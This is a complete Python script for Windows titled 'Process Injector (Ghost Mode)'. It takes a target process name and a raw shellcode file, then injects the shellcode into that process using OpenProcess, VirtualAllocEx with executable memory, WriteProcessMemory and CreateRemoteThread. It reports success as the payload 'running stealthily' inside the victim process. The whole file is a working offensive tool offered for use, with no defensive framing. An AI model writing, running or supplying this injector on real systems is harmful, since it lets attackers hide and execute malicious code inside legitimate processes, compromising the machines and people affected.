import sys
import ctypes
import argparse
import psutil

# Windows API Constants
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = ctypes.windll.kernel32

def get_pid_by_name(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def inject_shellcode(pid, shellcode):
    print(f"[*] Target PID: {pid}")
    
    # 1. OpenProcess
    print("[*] Calling OpenProcess...")
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print("[!] Could not access the target process. (Admin privileges might be required)")
        return False

    # 2. VirtualAllocEx
    print("[*] Allocating memory in target process (VirtualAllocEx)...")
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    if not arg_address:
        print("[!] Failed to allocate memory.")
        return False

    # 3. WriteProcessMemory
    print("[*] Writing shellcode to memory (WriteProcessMemory)...")
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), ctypes.byref(written))

    # 4. CreateRemoteThread
    print("[*] Creating remote thread to execute shellcode (CreateRemoteThread)...")
    thread_id = ctypes.c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id)):
        print("[!] Failed to create thread!")
        return False
        
    print(f"[+] SUCCESS! Shellcode is now running stealthily inside PID {pid} (Ghost Mode).")
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Process Injector (Ghost Mode)")
    parser.add_argument("-p", "--process", help="Target process name (e.g., explorer.exe)", required=True)
    parser.add_argument("-f", "--file", help="Raw shellcode file (.bin)", required=True)
    args = parser.parse_args()

    try:
        with open(args.file, "rb") as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)

    pid = get_pid_by_name(args.process)
    if not pid:
        print(f"[!] Process '{args.process}' not found. Please start the process first.")
        sys.exit(1)

    inject_shellcode(pid, shellcode)
